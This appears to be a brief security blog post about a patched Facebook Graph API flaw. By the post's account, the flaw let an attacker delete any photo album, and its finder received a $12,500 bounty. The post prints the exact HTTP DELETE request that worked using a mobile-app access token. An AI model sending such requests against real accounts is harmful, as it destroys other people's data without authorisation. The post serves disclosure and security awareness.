---
layout: post
title: "Discovered (and fixed) a vulnerability that permits attacker to delete any photo album on Facebook"
description: "Discovered (and fixed) a vulnerability that permits attacker to delete any photo album on Facebook"
category: Security
tags: 
- Facebook
- Exploit
- Reward
- Vulnerability
---
{% include JB/setup %}

[Laxman Muthiyah](https://plus.google.com/104205981064231768788) on his blog has [published](http://www.7xter.com/2015/02/how-i-hacked-your-facebook-photos.html) a post that explain a vulnerability on Facebook OpenGraph API, that permits an attacker to delete any photo album on Facebook. 


![FACEBOOK](http://4.bp.blogspot.com/-0-v9JVM_6Iw/VNuhDwi-hMI/AAAAAAAAAA8/BlXn8DsZ-NI/s1600/first%2Back.JPG)

<!-- more -->

Muthiyah immediatly reports the bug to Facebook: the vulnerability was fixed in less than 2 hour, and the researcher was rewarded with $12500 USD!

![Reward](http://2.bp.blogspot.com/-c0cQE6SkEo4/VNuhyzOrZvI/AAAAAAAAABE/BkT-jFeMtyo/s1600/second%2Back.JPG)


The exploit is very simple: this HTTP API request 

{% highlight json %}
DELETE /518171421550249 HTTP/1.1
Host :  graph.facebook.com 
Content-Length: 245
access_token=<Facebook_for_Android_Access_Token>
{% endhighlight %}

made with a **Access Token** generated for *Facebook Mobile App* deletes the album #518171421550249 without any security check.

Here a video demonstration

<iframe width="640" height="360" src="https://www.youtube.com/embed/trbriB_5qVA" frameborder="0" allowfullscreen></iframe>